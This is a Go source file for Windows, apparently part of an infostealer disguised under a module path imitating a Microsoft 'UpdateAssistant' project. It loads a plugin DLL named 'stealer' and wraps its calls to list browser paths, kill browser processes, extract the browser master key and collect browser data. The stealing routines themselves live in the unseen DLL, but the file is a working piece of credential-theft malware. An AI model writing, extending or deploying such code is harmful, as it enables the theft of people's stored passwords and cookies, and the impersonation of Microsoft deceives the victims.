//go:build windows

package sysutil

import (
	"runtime"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

func stealerDLL(fn func(*loader.Plugin)) {
	p, err := loader.Load("stealer")
	if err != nil {
		logger.Error("stealer: dll load failed: %v", err)
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func StealerPaths() string {
	var r string
	stealerDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("browser_paths", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
		if err != nil {
			logger.Error("stealer: browser_paths failed: %v", err)
			return
		}
		r = string(buf[:int(n)])
	})
	return r
}

func StealerKill() string {
	var r string
	stealerDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("browser_kill", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
		if err != nil {
			logger.Error("stealer: browser_kill failed: %v", err)
			return
		}
		r = string(buf[:int(n)])
	})
	return r
}

func StealerMasterKey() string {
	var r string
	stealerDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("masterkey_get", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
		if err != nil {
			logger.Error("stealer: masterkey_get failed: %v", err)
			return
		}
		r = string(buf[:int(n)])
	})
	return r
}

func StealerRun() string {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	var r string
	stealerDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.FileCap)
		n, err := p.Call("get_browsers_info", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.FileCap))
		if err != nil {
			logger.Error("stealer: get_browsers_info failed: %v", err)
			return
		}
		r = string(buf[:int(n)])
	})
	return r
}
